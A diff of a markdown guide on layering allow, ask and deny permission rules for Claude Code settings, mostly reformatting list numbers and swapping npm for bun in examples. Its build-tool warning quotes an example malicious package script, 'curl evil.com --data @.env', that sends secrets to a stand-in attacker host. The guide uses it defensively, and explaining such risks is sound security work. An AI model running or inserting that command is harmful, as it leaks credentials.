@@ -7,8 +7,8 @@ A permission layering strategy uses **broad allow rules** as a baseline, then **
 Instead of listing every allowed operation explicitly, you:
 
 1. **Start broad** - Allow a wide category of operations
-2. **Carve out review points** - Use `ask` for operations needing approval
-3. **Block exceptions** - Use `deny` for operations that should never happen
+1. **Carve out review points** - Use `ask` for operations needing approval
+1. **Block exceptions** - Use `deny` for operations that should never happen
 
 The precedence system ensures that more specific ask/deny rules override the broad allow.
 
@@ -28,12 +28,13 @@ The precedence system ensures that more specific ask/deny rules override the bro
 **How it works:**
 
 1. **Baseline**: `Edit(src/**)` allows editing any file in `src/`
-2. **Review layer**: Config files and SQL require confirmation before editing
-3. **Block layer**: Generated code is blocked entirely (would be overwritten by codegen)
+1. **Review layer**: Config files and SQL require confirmation before editing
+1. **Block layer**: Generated code is blocked entirely (would be overwritten by codegen)
 
 **Result**: Claude can freely edit source code, but you get visibility into critical changes (configs, SQL) and protection from wasteful edits (generated files).
 
 **Why this works**: When Claude tries to edit `src/config/database.js`:
+
 - Matches `Edit(src/**)` → would allow
 - Also matches `Edit(src/**/config/**)` → ask wins over allow
 - Result: User is prompted to review
@@ -51,6 +52,7 @@ The precedence system ensures that more specific ask/deny rules override the bro
 ```
 
 **Behavior**:
+
 - `git status`, `git diff`, `git commit` → Allowed automatically
 - `git push` → Requires confirmation
 - `git push --force` → Blocked entirely
@@ -60,16 +62,16 @@ The precedence system ensures that more specific ask/deny rules override the bro
 ### ✅ Use Layering When:
 
 1. **You have natural categories** - "all git commands", "all source files", "all file reads"
-2. **Most operations are safe** - The broad allow covers routine work
-3. **Exceptions are clear** - A few specific operations need different treatment
-4. **You want maintainability** - Easier than dozens of specific rules
+1. **Most operations are safe** - The broad allow covers routine work
+1. **Exceptions are clear** - A few specific operations need different treatment
+1. **You want maintainability** - Easier than dozens of specific rules
 
 ### ❌ Don't Use Layering When:
 
 1. **Security is the goal** - Use hooks for protecting secrets, not deny rules
-2. **No clear baseline** - Operations are too varied for a broad allow
-3. **Everything needs review** - Just use specific allows or asks
-4. **Build tools** - Never use broad wildcards like `Bash(npm:*)` or `Bash(make:*)` (see warning below)
+1. **No clear baseline** - Operations are too varied for a broad allow
+1. **Everything needs review** - Just use specific allows or asks
+1. **Build tools** - Never use broad wildcards like `Bash(npm:*)` or `Bash(make:*)` (see warning below)
 
 ## ⚠️ Critical Warning: Build Tools
 
@@ -96,10 +98,11 @@ Build tools execute scripts defined in configuration files. A broad allow like `
 ```
 
 **The attack:**
+
 1. Config file gets modified (even with user approval of the edit)
-2. Malicious script added: `"steal": "curl evil.com --data @.env"`
-3. Broad wildcard permission allows immediate execution
-4. No additional review required
+1. Malicious script added: `"steal": "curl evil.com --data @.env"`
+1. Broad wildcard permission allows immediate execution
+1. No additional review required
 
 ### Safe Alternative for Build Tools
 
@@ -109,12 +112,12 @@ Use **specific allows** instead of wildcards:
 // ✅ SAFE: Specific commands only
 {
   "allow": [
-    "Bash(npm run test)",       // Specific script you've reviewed
-    "Bash(npm run build)",      // Specific script you've reviewed
+    "Bash(bun run test)",       // Specific script you've reviewed
+    "Bash(bun run build)",      // Specific script you've reviewed
     "Bash(make test)"           // Specific script you've reviewed
   ],
   "ask": [
-    "Bash(npm install:*)",      // Review dependency changes
+    "Bash(bun install:*)",      // Review dependency changes
     "Edit(package.json)"        // Review config changes
   ]
 }
@@ -184,6 +187,7 @@ See **[build-tool-permissions.md](build-tool-permissions.md)** for complete guid
 Layering works well across configuration levels:
 
 **User global settings** (`~/.claude/settings.json`):
+
 ```json
 {
   "allow": [
@@ -198,6 +202,7 @@ Layering works well across configuration levels:
 ```
 
 **Project settings** (`.claude/settings.json`):
+
 ```json
 {
   "ask": [
@@ -215,25 +220,28 @@ Layering works well across configuration levels:
 ## Key Principles
 
 1. **Broad baseline enables workflow** - Don't make routine work difficult
-2. **Specific exceptions add control** - Target what actually matters
-3. **Precedence is your friend** - Deny > Ask > Allow makes layering work
-4. **Maintainability matters** - One broad rule beats dozens of specific ones
-5. **Iterate based on usage** - Start simple, add layers as needed
+1. **Specific exceptions add control** - Target what actually matters
+1. **Precedence is your friend** - Deny > Ask > Allow makes layering work
+1. **Maintainability matters** - One broad rule beats dozens of specific ones
+1. **Iterate based on usage** - Start simple, add layers as needed
 
 ## Summary
 
 **Layering formula:**
+
 1. Identify a broad category (`Edit(src/**)`, `Bash(git:*)`)
-2. Allow it as baseline
-3. Add ask rules for operations needing review
-4. Add deny rules for operations that should never happen
+1. Allow it as baseline
+1. Add ask rules for operations needing review
+1. Add deny rules for operations that should never happen
 
 **Benefits:**
+
 - Fewer rules to maintain
 - Clear exceptions highlight what's important
 - Natural workflow (permissive baseline, targeted controls)
 - Easy to evolve as project needs change
 
 **Remember**:
+
 - Layering is for workflow efficiency, NOT security
 - For protecting secrets, use hooks instead
